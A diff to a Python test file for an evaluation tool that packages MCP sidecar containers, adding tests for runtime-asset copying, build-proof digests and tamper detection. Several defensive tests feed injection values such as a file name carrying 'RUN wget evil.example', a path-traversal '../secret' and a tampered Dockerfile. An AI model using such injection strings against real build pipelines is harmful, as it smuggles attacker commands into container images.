@@ -12,16 +12,22 @@ from typing import Any
 import pytest
 import yaml
 
-from evallab.benchmark_program_contracts import FaultClass, FaultInjectionRecord
+from evallab.benchmark_program_contracts import (
+    FaultClass,
+    FaultInjectionRecord,
+    compute_sha256,
+)
 from evallab.mcp_substrate import (
     DEFAULT_PINNED_BASE_IMAGE,
-    DEFAULT_TARGET_PLATFORM_TAG,
+    DEFAULT_SIDECAR_SERVICE,
+        DEFAULT_TARGET_PLATFORM_TAG,
     DEFAULT_TARGET_PYTHON_TAG,
     FASTMCP_VERSION_CONSTRAINTS,
     PINNED_BASE_IMAGE_AMD64_MANIFEST_DIGEST,
     PINNED_BASE_IMAGE_INDEX_DIGEST,
     MCPToolDefinition,
     MCPToolParameter,
+    RuntimeAsset,
     SubstrateError,
     WheelhouseTarget,
     compute_mcp_substrate_digest,
@@ -31,6 +37,7 @@ from evallab.mcp_substrate import (
     render_mcp_compose_document,
     render_mcp_sidecar_dockerfile,
     render_selected_wheel_lock,
+    stage_platform_wheelhouse,
     validate_mcp_compose_document,
     validate_target_base_runtime,
 )
@@ -75,9 +82,13 @@ def test_mcp_substrate_workbench_v2_integration_acceptance(tmp_path: Path):
         tools=[tool],
         plan_only=True,
     )
+    assert pkg["compose_doc"] is None
     (sidecar_dir / "Dockerfile").write_text(f"FROM {DEFAULT_PINNED_BASE_IMAGE}\n", encoding="utf-8")
-
-    (env_dir / "docker-compose.yaml").write_text(yaml.dump(pkg["compose_doc"]), encoding="utf-8")
+    compose_doc = render_mcp_compose_document(
+        sidecar_service=DEFAULT_SIDECAR_SERVICE,
+        sidecar_build_context="./" + sidecar_dir.name,
+    )
+    (env_dir / "docker-compose.yaml").write_text(yaml.dump(compose_doc), encoding="utf-8")
 
     diagnostics: list[Any] = []
     topology, sidecar_name = _validate_compose_topology(resolved_root, diagnostics)
@@ -508,7 +519,7 @@ def test_target_base_runtime_rejects_mismatch_and_unpinned_images():
             DEFAULT_TARGET_PYTHON_TAG,
             DEFAULT_TARGET_PLATFORM_TAG,
             DEFAULT_PINNED_BASE_IMAGE,
-            base_image_amd64_manifest_digest="sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                base_image_amd64_manifest_digest="sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
         )
     with pytest.raises(SubstrateError, match="python tag"):
         validate_target_base_runtime("cp313", DEFAULT_TARGET_PLATFORM_TAG)
@@ -556,3 +567,586 @@ def test_digest_binds_base_runtime_identity():
         base_image=DEFAULT_PINNED_BASE_IMAGE,
     )
     assert d1 == d2
+
+
+def _runtime_asset_tool() -> MCPToolDefinition:
+    return MCPToolDefinition(
+        name="ping",
+        description="ping",
+        parameters=(MCPToolParameter(name="x", type_name="int", description="x"),),
+        metadata={"op_kind": "ping"},
+    )
+
+
+def test_runtime_assets_copied_sorted_and_bound_in_proof(tmp_path: Path):
+    ops = tmp_path / "src_ops.py"
+    ops.write_text("OP_REGISTRY = {'ping': lambda: 'pong'}\n", encoding="utf-8")
+    sealed = tmp_path / "sealed.bin"
+    sealed.write_bytes(b"\x00sealed\xff")
+    pkg = tmp_path / "pkg"
+    materialize_mcp_sidecar_package(
+        target_dir=pkg,
+        tools=[_runtime_asset_tool()],
+        plan_only=True,
+        op_registry_module="ops",
+        runtime_assets=(
+            RuntimeAsset("ops.py", ops),
+            RuntimeAsset("evidence/sealed.bin", sealed),
+        ),
+    )
+    assert (pkg / "ops.py").read_bytes() == ops.read_bytes()
+    assert (pkg / "evidence" / "sealed.bin").read_bytes() == b"\x00sealed\xff"
+    assert "from ops import OP_REGISTRY" in (pkg / "server.py").read_text(encoding="utf-8")
+    proof = json.loads((pkg / "offline-build-proof.json").read_text(encoding="utf-8"))
+    assert [item["path"] for item in proof["runtime_assets"]] == [
+        "evidence/sealed.bin",
+        "ops.py",
+    ]
+    assert proof["runtime_assets"][0]["sha256"] == compute_sha256(b"\x00sealed\xff")
+    assert proof["runtime_assets"][0]["size_bytes"] == 8
+    assert proof["runtime_assets"][1]["sha256"] == compute_sha256(ops.read_bytes())
+    dockerfile = render_mcp_sidecar_dockerfile(
+        runtime_assets=(
+            RuntimeAsset("ops.py", ops),
+            RuntimeAsset("evidence/sealed.bin", sealed),
+        )
+    )
+    assert dockerfile.index("COPY server.py /app/server.py\n") < dockerfile.index(
+        "COPY evidence/sealed.bin /app/evidence/sealed.bin\n"
+    )
+    assert dockerfile.index(
+        "COPY evidence/sealed.bin /app/evidence/sealed.bin\n"
+    ) < dockerfile.index("COPY ops.py /app/ops.py\n")
+    copy_lines = [line for line in dockerfile.splitlines() if line.startswith("COPY ")]
+    assert copy_lines == [
+        "COPY wheelhouse /wheelhouse",
+        "COPY requirements.txt /app/requirements.txt",
+        "COPY server.py /app/server.py",
+        "COPY evidence/sealed.bin /app/evidence/sealed.bin",
+        "COPY ops.py /app/ops.py",
+    ]
+
+
+def test_runtime_asset_byte_and_path_changes_shift_proof_and_digest(tmp_path: Path):
+    first = tmp_path / "first.bin"
+    first.write_bytes(b"alpha")
+    second = tmp_path / "second.bin"
+    second.write_bytes(b"beta!")
+    tool = _runtime_asset_tool()
+    topology = render_mcp_compose_document()
+    digest_a = compute_mcp_substrate_digest(
+        topology, [tool], runtime_assets=(RuntimeAsset("evidence/a.bin", first),)
+    )
+    digest_byte = compute_mcp_substrate_digest(
+        topology, [tool], runtime_assets=(RuntimeAsset("evidence/a.bin", second),)
+    )
+    digest_path = compute_mcp_substrate_digest(
+        topology, [tool], runtime_assets=(RuntimeAsset("evidence/b.bin", first),)
+    )
+    digest_none = compute_mcp_substrate_digest(topology, [tool])
+    assert digest_a != digest_byte
+    assert digest_a != digest_path
+    assert digest_none != digest_a
+    assert digest_none == compute_mcp_substrate_digest(topology, [tool], runtime_assets=())
+
+    pkg_a = tmp_path / "pkg_a"
+    pkg_byte = tmp_path / "pkg_byte"
+    pkg_path = tmp_path / "pkg_path"
+    materialize_mcp_sidecar_package(
+        target_dir=pkg_a,
+        tools=[tool],
+        plan_only=True,
+        runtime_assets=(RuntimeAsset("evidence/a.bin", first),),
+    )
+    materialize_mcp_sidecar_package(
+        target_dir=pkg_byte,
+        tools=[tool],
+        plan_only=True,
+        runtime_assets=(RuntimeAsset("evidence/a.bin", second),),
+    )
+    materialize_mcp_sidecar_package(
+        target_dir=pkg_path,
+        tools=[tool],
+        plan_only=True,
+        runtime_assets=(RuntimeAsset("evidence/b.bin", first),),
+    )
+    proof_a = (pkg_a / "offline-build-proof.json").read_text(encoding="utf-8")
+    assert proof_a != (pkg_byte / "offline-build-proof.json").read_text(encoding="utf-8")
+    assert proof_a != (pkg_path / "offline-build-proof.json").read_text(encoding="utf-8")
+
+
+def test_production_runtime_assets_bind_final_dockerfile_digest(tmp_path: Path):
+    wheelhouse = Path("/tmp/fastmcp3_wheelhouse")
+    if not wheelhouse.is_dir():
+        pytest.skip("FastMCP 3.4.7 wheelhouse not populated on this host")
+    linux_target = WheelhouseTarget(DEFAULT_TARGET_PYTHON_TAG, DEFAULT_TARGET_PLATFORM_TAG)
+    try:
+        provenance = record_prepackaging_provenance(wheelhouse, linux_target)
+    except SubstrateError:
+        pytest.skip("Linux CPython 3.12 manylinux wheelhouse not populated on this host")
+    ops = tmp_path / "ops.py"
+    ops.write_text("OP_REGISTRY = {'ping': lambda: 'pong'}\n", encoding="utf-8")
+    pkg = tmp_path / "prod"
+    materialize_mcp_sidecar_package(
+        target_dir=pkg,
+        tools=[_runtime_asset_tool()],
+        op_registry_module="ops",
+        runtime_assets=(RuntimeAsset("ops.py", ops),),
+        wheelhouse_source=wheelhouse,
+        target=linux_target,
+        resolver_provenance=provenance,
+    )
+    dockerfile = (pkg / "Dockerfile").read_text(encoding="utf-8")
+    proof = json.loads((pkg / "offline-build-proof.json").read_text(encoding="utf-8"))
+    assert "COPY ops.py /app/ops.py" in dockerfile
+    assert proof["dockerfile_sha256"] == compute_sha256(dockerfile)
+    assert proof["runtime_assets"][0]["path"] == "ops.py"
+
+
+@pytest.mark.parametrize(
+    ("destination", "match"),
+    [
+        ("../secret", "directory escape|Path must be relative|confined POSIX"),
+        ("server.py", "reserved"),
+        ("wheelhouse/extra.whl", "reserved"),
+    ],
+)
+def test_runtime_asset_rejects_traversal_and_reserved(
+    tmp_path: Path, destination: str, match: str
+):
+    source = tmp_path / "payload.bin"
+    source.write_bytes(b"payload")
+    pkg = tmp_path / "pkg"
+    with pytest.raises(SubstrateError, match=match):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(RuntimeAsset(destination, source),),
+        )
+    assert not pkg.exists()
+
+
+def test_runtime_asset_rejects_symlink_source(tmp_path: Path):
+    real = tmp_path / "real.py"
+    real.write_text("OP_REGISTRY = {}\n", encoding="utf-8")
+    link = tmp_path / "link.py"
+    link.symlink_to(real)
+    pkg = tmp_path / "pkg"
+    with pytest.raises(SubstrateError, match="symlink"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(RuntimeAsset("ops.py", link),),
+        )
+    assert not pkg.exists()
+
+
+def test_runtime_asset_rejects_symlink_destination(tmp_path: Path):
+    real = tmp_path / "real.py"
+    real.write_text("OP_REGISTRY = {}\n", encoding="utf-8")
+    pkg = tmp_path / "pkg"
+    pkg.symlink_to(real)
+    with pytest.raises(SubstrateError, match="already exists|symlink"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(RuntimeAsset("ops.py", real),),
+        )
+
+
+def test_runtime_asset_rejects_duplicate_destinations(tmp_path: Path):
+    first = tmp_path / "a.py"
+    second = tmp_path / "b.py"
+    first.write_text("OP_REGISTRY = {'a': 1}\n", encoding="utf-8")
+    second.write_text("OP_REGISTRY = {'b': 2}\n", encoding="utf-8")
+    pkg = tmp_path / "pkg"
+    with pytest.raises(SubstrateError, match="Duplicate"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(
+                RuntimeAsset("ops.py", first),
+                RuntimeAsset("ops.py", second),
+            ),
+        )
+    assert not pkg.exists()
+
+
+def test_op_registry_module_requires_matching_runtime_asset(tmp_path: Path):
+    evidence = tmp_path / "scenario.json"
+    evidence.write_text("{}", encoding="utf-8")
+    pkg = tmp_path / "pkg"
+    with pytest.raises(SubstrateError, match="requires runtime asset 'ops.py'"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            op_registry_module="ops",
+            runtime_assets=(RuntimeAsset("scenario.json", evidence),),
+        )
+    assert not pkg.exists()
+
+
+def test_dockerfile_renderer_rejects_instruction_injection(tmp_path: Path):
+    dummy = tmp_path / "dummy.py"
+    dummy.write_text("x\n", encoding="utf-8")
+    with pytest.raises(SubstrateError, match="control characters|confined POSIX"):
+        render_mcp_sidecar_dockerfile(
+            runtime_assets=(RuntimeAsset("ops.py\nRUN wget evil.example", dummy),)
+        )
+    with pytest.raises(SubstrateError, match="base image"):
+        render_mcp_sidecar_dockerfile(
+            base_image=DEFAULT_PINNED_BASE_IMAGE + "\nRUN wget evil.example"
+        )
+
+
+def test_runtime_asset_rejects_dockerignore_and_casefold_collisions(tmp_path: Path):
+    payload = tmp_path / "payload.bin"
+    payload.write_bytes(b"x")
+    pkg = tmp_path / "pkg"
+    with pytest.raises(SubstrateError, match="reserved"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(RuntimeAsset(".dockerignore", payload),),
+        )
+    with pytest.raises(SubstrateError, match="reserved"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg / "case",
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(RuntimeAsset("Server.py", payload),),
+        )
+    first = tmp_path / "a.py"
+    second = tmp_path / "b.py"
+    first.write_text("OP_REGISTRY = {}\n", encoding="utf-8")
+    second.write_text("OP_REGISTRY = {}\n", encoding="utf-8")
+    with pytest.raises(SubstrateError, match="Duplicate"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg / "dup",
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(
+                RuntimeAsset("ops.py", first),
+                RuntimeAsset("OPS.py", second),
+            ),
+        )
+
+
+def test_runtime_asset_rejects_prefix_conflicts(tmp_path: Path):
+    file_a = tmp_path / "a.bin"
+    file_b = tmp_path / "b.bin"
+    file_a.write_bytes(b"a")
+    file_b.write_bytes(b"b")
+    pkg = tmp_path / "pkg"
+    with pytest.raises(SubstrateError, match="prefix"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(
+                RuntimeAsset("a", file_a),
+                RuntimeAsset("a/b", file_b),
+            ),
+        )
+    assert not pkg.exists()
+    with pytest.raises(SubstrateError, match="prefix"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg / "case",
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(
+                RuntimeAsset("A", file_a),
+                RuntimeAsset("a/b", file_b),
+            ),
+        )
+    with pytest.raises(SubstrateError, match="prefix"):
+        render_mcp_sidecar_dockerfile(
+            runtime_assets=(
+                RuntimeAsset("nested/file", file_a),
+                RuntimeAsset("nested", file_b),
+            )
+        )
+
+
+def test_materialize_refuses_existing_target_path(tmp_path: Path):
+    # Existing directory
+    pkg_dir = tmp_path / "pkg_dir"
+    pkg_dir.mkdir()
+    with pytest.raises(SubstrateError, match="already exists"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg_dir,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+        )
+
+    # Existing file
+    pkg_file = tmp_path / "pkg_file"
+    pkg_file.write_text("dummy", encoding="utf-8")
+    with pytest.raises(SubstrateError, match="already exists"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg_file,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+        )
+
+    # Existing symlink
+    real_dir = tmp_path / "real_dir"
+    real_dir.mkdir()
+    pkg_link = tmp_path / "pkg_link"
+    pkg_link.symlink_to(real_dir)
+    with pytest.raises(SubstrateError, match="already exists|symlink"):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg_link,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+        )
+
+
+def test_planted_wheelhouse_symlinks_rejected(tmp_path: Path):
+    real_wh = tmp_path / "real_wh"
+    real_wh.mkdir()
+    wh_link = tmp_path / "wh_link"
+    wh_link.symlink_to(real_wh)
+    with pytest.raises(SubstrateError, match="symlink"):
+        stage_platform_wheelhouse(
+            wh_link, tmp_path / "dest_wh", WheelhouseTarget(DEFAULT_TARGET_PYTHON_TAG, DEFAULT_TARGET_PLATFORM_TAG)
+        )
+
+
+def test_atomic_staging_cleans_up_on_failure_and_leaves_target_absent(tmp_path: Path):
+    pkg = tmp_path / "unborn_pkg"
+    bad_asset = tmp_path / "bad.bin"
+    bad_asset.symlink_to(tmp_path / "nonexistent")
+    with pytest.raises(SubstrateError):
+        materialize_mcp_sidecar_package(
+            target_dir=pkg,
+            tools=[_runtime_asset_tool()],
+            plan_only=True,
+            runtime_assets=(RuntimeAsset("bad.bin", bad_asset),),
+        )
+    assert not pkg.exists()
+    staging_dirs = [p for p in tmp_path.iterdir() if p.name.startswith(".unborn_pkg.")]
+    assert len(staging_dirs) == 0
+
+
+def test_stage_platform_wheelhouse_single_pass_bytes_and_lock(tmp_path: Path):
+    import zipfile
+    source_wh = tmp_path / "src_wh"
+    source_wh.mkdir()
+    wh1 = source_wh / "fastmcp-3.4.7-py3-none-any.whl"
+    with zipfile.ZipFile(wh1, "w") as zf:
+        zf.writestr("fastmcp-3.4.7.dist-info/METADATA", "Metadata-Version: 2.1\nName: fastmcp\nVersion: 3.4.7\n")
+    dest_wh = tmp_path / "dest_wh"
+    target = WheelhouseTarget("cp312", "manylinux_2_17_x86_64")
+    lock, inventory = stage_platform_wheelhouse(source_wh, dest_wh, target)
+    assert (dest_wh / "fastmcp-3.4.7-py3-none-any.whl").is_file()
+    staged_bytes = (dest_wh / "fastmcp-3.4.7-py3-none-any.whl").read_bytes()
+    staged_hash = compute_sha256(staged_bytes)
+    assert inventory[0]["sha256"] == staged_hash
+    assert f"fastmcp==3.4.7 --hash=sha256:{staged_hash}" in lock
+
+
+def test_task_workbench_validates_nested_sidecar_build_proof(tmp_path: Path):
+    import zipfile
+
+    from evallab.task_workbench import (
+        _validate_build_context_contents,
+        _validate_compose_topology,
+        _validate_offline_build_proofs,
+    )
+
+    env_dir = tmp_path / "environment"
+    env_dir.mkdir()
+    (env_dir / "Dockerfile").write_text(f"FROM {DEFAULT_PINNED_BASE_IMAGE}\n", encoding="utf-8")
+
+    sidecar_dir = env_dir / "mcp-server"
+    wh = tmp_path / "wh"
+    wh.mkdir()
+    wh1 = wh / "fastmcp-3.4.7-py3-none-any.whl"
+    with zipfile.ZipFile(wh1, "w") as zf:
+        zf.writestr("fastmcp-3.4.7.dist-info/METADATA", "Metadata-Version: 2.1\nName: fastmcp\nVersion: 3.4.7\n")
+    target = WheelhouseTarget(DEFAULT_TARGET_PYTHON_TAG, DEFAULT_TARGET_PLATFORM_TAG)
+    prov = record_prepackaging_provenance(wh, target)
+
+    sealed = tmp_path / "sealed.bin"
+    sealed.write_bytes(b"\x00sealed-evidence\xff")
+    tool = _runtime_asset_tool()
+    pkg = materialize_mcp_sidecar_package(
+        target_dir=sidecar_dir,
+        tools=[tool],
+        wheelhouse_source=wh,
+        resolver_provenance=prov,
+        runtime_assets=(RuntimeAsset("evidence/sealed.bin", sealed),),
+        plan_only=False,
+    )
+    compose_doc = pkg["compose_doc"]
+    (env_dir / "docker-compose.yaml").write_text(yaml.dump(compose_doc), encoding="utf-8")
+
+    diagnostics: list[Any] = []
+    compose_topology, sidecar_name = _validate_compose_topology(tmp_path, diagnostics)
+    assert sidecar_name == "mcp-service"
+    assert len(diagnostics) == 0
+
+    build_proofs = _validate_offline_build_proofs(tmp_path, diagnostics, compose_topology=compose_topology)
+    assert "environment/mcp-server" in build_proofs
+    assert len(diagnostics) == 0
+
+    _validate_build_context_contents(tmp_path, diagnostics, build_proofs, compose_topology=compose_topology)
+    assert len(diagnostics) == 0
+
+
+def test_task_workbench_rejects_nested_sidecar_proof_mismatch_and_escapes(tmp_path: Path):
+    from evallab.task_workbench import (
+        _validate_compose_topology,
+    )
+
+    env_dir = tmp_path / "environment"
+    env_dir.mkdir()
+    sidecar_dir = env_dir / "mcp-server"
+    sidecar_dir.mkdir()
+
+    # Escape path in compose
+    bad_compose = render_mcp_compose_document(
+        sidecar_service="mcp-service",
+        sidecar_build_context="../escaped",
+    )
+    (env_dir / "docker-compose.yaml").write_text(yaml.dump(bad_compose), encoding="utf-8")
+    diagnostics: list[Any] = []
+    _validate_compose_topology(tmp_path, diagnostics)
+    assert any(d.code == "compose_build_path_escape" for d in diagnostics)
+
+
+def test_task_workbench_rejects_tampered_sidecar_proof_fields(tmp_path: Path):
+    import zipfile
+
+    from evallab.task_workbench import (
+        _validate_compose_topology,
+        _validate_offline_build_proofs,
+    )
+
+    env_dir = tmp_path / "environment"
+    env_dir.mkdir()
+    (env_dir / "Dockerfile").write_text(f"FROM {DEFAULT_PINNED_BASE_IMAGE}\n", encoding="utf-8")
+
+    sidecar_dir = env_dir / "mcp-server"
+    wh = tmp_path / "wh"
+    wh.mkdir()
+    wh1 = wh / "fastmcp-3.4.7-py3-none-any.whl"
+    with zipfile.ZipFile(wh1, "w") as zf:
+        zf.writestr("fastmcp-3.4.7.dist-info/METADATA", "Metadata-Version: 2.1\nName: fastmcp\nVersion: 3.4.7\n")
+    target = WheelhouseTarget(DEFAULT_TARGET_PYTHON_TAG, DEFAULT_TARGET_PLATFORM_TAG)
+    prov = record_prepackaging_provenance(wh, target)
+
+    ops = tmp_path / "ops.py"
+    ops.write_text("OP_REGISTRY = {}\n", encoding="utf-8")
+
+    tool = _runtime_asset_tool()
+    pkg = materialize_mcp_sidecar_package(
+        target_dir=sidecar_dir,
+        tools=[tool],
+        wheelhouse_source=wh,
+        resolver_provenance=prov,
+        op_registry_module="ops",
+        runtime_assets=(RuntimeAsset("ops.py", ops),),
+        plan_only=False,
+    )
+    compose_doc = pkg["compose_doc"]
+    (env_dir / "docker-compose.yaml").write_text(yaml.dump(compose_doc), encoding="utf-8")
+
+    diagnostics: list[Any] = []
+    compose_topology, sidecar_name = _validate_compose_topology(tmp_path, diagnostics)
+    _ = _validate_offline_build_proofs(tmp_path, diagnostics, compose_topology=compose_topology)
+    assert len(diagnostics) == 0
+
+    # 1. Tamper ops.py bytes -> proof invalid
+    (sidecar_dir / "ops.py").write_text("OP_REGISTRY = {'tampered': 1}\n", encoding="utf-8")
+    diag1: list[Any] = []
+    _validate_offline_build_proofs(tmp_path, diag1, compose_topology=compose_topology)
+    assert any("runtime asset 'ops.py'" in d.message for d in diag1)
+    (sidecar_dir / "ops.py").write_text("OP_REGISTRY = {}\n", encoding="utf-8")
+
+    # 2. Tamper Dockerfile -> proof invalid
+    (sidecar_dir / "Dockerfile").write_text(f"FROM {DEFAULT_PINNED_BASE_IMAGE}\nRUN id\n", encoding="utf-8")
+    diag2: list[Any] = []
+    _validate_offline_build_proofs(tmp_path, diag2, compose_topology=compose_topology)
+    assert any("Dockerfile digest" in d.message for d in diag2)
+    (sidecar_dir / "Dockerfile").write_text(render_mcp_sidecar_dockerfile(runtime_assets=(RuntimeAsset("ops.py", ops),)), encoding="utf-8")
+
+    # 3. Add extra unapproved wheel in wheelhouse -> unpinned dependency
+    (sidecar_dir / "wheelhouse" / "extra-1.0.0-py3-none-any.whl").write_bytes(b"bad")
+    diag3: list[Any] = []
+    _validate_offline_build_proofs(tmp_path, diag3, compose_topology=compose_topology)
+    assert any("actual regular wheel count" in d.message or "extra unapproved wheels" in d.message for d in diag3)
+
+
+def test_task_workbench_rejects_missing_fields_and_unmapped_assets(tmp_path: Path):
+    import zipfile
+
+    from evallab.task_workbench import (
+        _validate_compose_topology,
+        _validate_offline_build_proofs,
+    )
+
+    env_dir = tmp_path / "environment"
+    env_dir.mkdir()
+    (env_dir / "Dockerfile").write_text(f"FROM {DEFAULT_PINNED_BASE_IMAGE}\n", encoding="utf-8")
+
+    sidecar_dir = env_dir / "mcp-server"
+    wh = tmp_path / "wh"
+    wh.mkdir()
+    wh1 = wh / "fastmcp-3.4.7-py3-none-any.whl"
+    with zipfile.ZipFile(wh1, "w") as zf:
+        zf.writestr("fastmcp-3.4.7.dist-info/METADATA", "Metadata-Version: 2.1\nName: fastmcp\nVersion: 3.4.7\n")
+    target = WheelhouseTarget(DEFAULT_TARGET_PYTHON_TAG, DEFAULT_TARGET_PLATFORM_TAG)
+    prov = record_prepackaging_provenance(wh, target)
+
+    ops = tmp_path / "ops.py"
+    ops.write_text("OP_REGISTRY = {}\n", encoding="utf-8")
+
+    tool = _runtime_asset_tool()
+    pkg = materialize_mcp_sidecar_package(
+        target_dir=sidecar_dir,
+        tools=[tool],
+        wheelhouse_source=wh,
+        resolver_provenance=prov,
+        op_registry_module="ops",
+        runtime_assets=(RuntimeAsset("ops.py", ops),),
+        plan_only=False,
+    )
+    compose_doc = pkg["compose_doc"]
+    (env_dir / "docker-compose.yaml").write_text(yaml.dump(compose_doc), encoding="utf-8")
+
+    compose_topology, _ = _validate_compose_topology(tmp_path, [])
+    proof_path = sidecar_dir / "offline-build-proof.json"
+    raw_proof = json.loads(proof_path.read_text(encoding="utf-8"))
+
+    # 1. Removed runtime_assets key from proof -> unmapped Dockerfile COPY source
+    p1 = dict(raw_proof)
+    p1["runtime_assets"] = []
+    proof_path.write_text(json.dumps(p1), encoding="utf-8")
+    d1 = []
+    _validate_offline_build_proofs(tmp_path, d1, compose_topology=compose_topology)
+    assert any("Dockerfile asset COPY lines" in d.message for d in d1)
+
+    # 2. Invalid wheel filename (traversal) -> invalid proof
+    p2 = dict(raw_proof)
+    p2["wheels"] = [{"filename": "../outside.whl", "sha256": "0" * 64, "size_bytes": 100}]
+    proof_path.write_text(json.dumps(p2), encoding="utf-8")
+    d2 = []
+    _validate_offline_build_proofs(tmp_path, d2, compose_topology=compose_topology)
+    assert any("wheel filename" in d.message for d in d2)
+
+    # 3. Missing dockerfile_sha256 -> invalid proof
+    p3 = dict(raw_proof)
+    del p3["dockerfile_sha256"]
+    proof_path.write_text(json.dumps(p3), encoding="utf-8")
+    d3 = []
+    _validate_offline_build_proofs(tmp_path, d3, compose_topology=compose_topology)
+    assert any("substrate proof requires valid sha256 'dockerfile_sha256'" in d.message for d in d3)
+
